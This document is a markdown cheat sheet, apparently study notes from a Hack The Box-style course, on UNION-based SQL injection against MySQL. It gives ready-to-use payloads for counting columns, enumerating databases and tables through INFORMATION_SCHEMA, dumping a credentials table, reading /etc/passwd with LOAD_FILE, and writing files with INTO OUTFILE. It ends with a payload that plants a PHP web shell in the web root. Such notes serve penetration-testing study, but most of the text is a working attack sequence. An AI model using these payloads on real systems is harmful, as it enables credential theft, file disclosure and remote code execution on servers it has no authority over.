# Sqli
## @Author : M3tr1c_r00t
### Union Clause
Is used to combine results from multiple SELECT statements. With this, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. 
```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```
Some of the rows belong to the ports table while others belong to the ships table.

__Note:__ The data types of the selected columns on all positions should be the same.
### Union on Same No of Columns

A UNION statement can only operate on SELECT statements with an equal number of columns.

If we attempt to UNION two queries that have results with a different number of columns, we get an error.
```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.
```
SELECT * FROM products WHERE product_id = ‘user_input’
```
We can inject a UNION query into the input, such that rows from another table are returned:
```
SELECT * from products where product_id = ‘1’ UNION SELECT username, password from passwords—‘
```
This would return username and password entries from the passwords table, assuming the products table has two columns.

### Un-even Columns
Suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.

We can use any string as our junk data, and the query will return the string as its output for that column. 

If we UNION with the string “junk”, the SELECT query would be SELECT “junk” from passwords, which will always return junk. 

We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.

__Note:__ When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error.

__**Tip:**__ For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

So we have to UNION with two columns. If we only wanted to get one column ‘e.g. username’, we have to do username, 2, such that we have the same number of columns:
```
SELECT * from products where product_id = ‘1’ UNION SELECT username, 2 from passwords
```
If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. 
```
UNION SELECT username, 2, 3, 4 from passwords—‘
```
This would return:
```
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords—‘

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```
As we can see, our wanted output of the ‘UNION SELECT username from passwords’ query is found at the first column of the second row, while the numbers filled the remaining columns.

### Union Injections
in a search parameter, we can try to put a single quote(') and see if we get an error.
#### Detecting Number of Columns
we can use
- ORDER BY
- UNION

#### ORDER BY
We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. 
```
' order by 1-- -
```

#### Using UNION
WE can use a Union injection with a different number of columns until we successfully get the results back.
 We can start by injecting a 3 column UNION query:
```
' UNION select 1,2,3-- -
```

While a query may return multiple columns, the web application may only display some of them.
So, if we inject our query in a column that is not printed on the page, we will not get its output.

 we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
 ```
 ' UNION select 1,@@version,3,4-- -
 ```
## Database Enumeration
### Mysql Fingerprinting
__identifying the type of db__

This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. 

We can use this to verify is we are working with mysql:
![image](https://user-images.githubusercontent.com/99975622/229519280-c21cfa7d-bb5b-4d76-b9dc-88d725ce4087.png)

### Information_Schema Database
To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
- List of databases
- List of tables within each database
- List of columns within each table

The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.

As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
```
SELECT * FROM my_database.users;
```
### Schemata (Finding Databases present)
The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server.

 It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
 
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

The same using union:
```
UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
__NB:__ The first 3 db's are usually defaults.

We can see the database being currently used by:
```
database()
```
### Finding Tables
We can use the TABLES table in the INFORMATION_SCHEMA Database.

The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns.

The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. 

We can use the following payload to find the tables within the dev database:
```
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.

### Finding Columns
To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. 

The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this
```
UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
In this case, the username table has 2 columns;username and password.

### Dumping the Data.
Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:

```
UNION select 1, username, password, 4 from dev.credentials-- -
```
__NB:__ Don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database


### Reading files
Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.

 To be able to find our current DB user, we can use any of the following queries:
```
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
union payload
```
UNION SELECT 1, user(), 3, 4-- -
```

### User Privileges
Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
```
SELECT super_priv FROM mysql.user

// or

UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
```
UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

In the response, Y means Yes and N means no

We can also dump other privileges we have directly from the schema, with the following query:
```
UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
Once again, we can add WHERE user="root" to only show our current user root privileges. Our payload would be:
```
UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```
With that, we can see all the commands we can execute.

__NB:__  the FILE privilege enables us to read files and potentially even write files.

#### Using LOAD_FILE
he LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. 
```
SELECT LOAD_FILE('/etc/passwd');
// or 
UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```


### Writing Files
To be able to write files to the back-end server using a MySQL database, we require three things:
- User with FILE privilege enabled
- MySQL global secure_file_priv variable not enabled
- Write access to the location we want to write to on the back-end server

We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable

The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. 

 NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. 
 
  MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
  
Within MySQL, we can use the following query to obtain the value of this variable:
```
SHOW VARIABLES LIKE 'secure_file_priv';
```
 As we are using a UNION injection, we have to get the value using a SELECT statement.
 
 This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
 
```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
// or

UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
#### SELECT INTO OUTFILE

The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
we can check the file;
```
MetricCode@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f

```
It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

__Note:__ To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

In our case;
```
union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
Writing a web_shell;
```
union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

 



## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
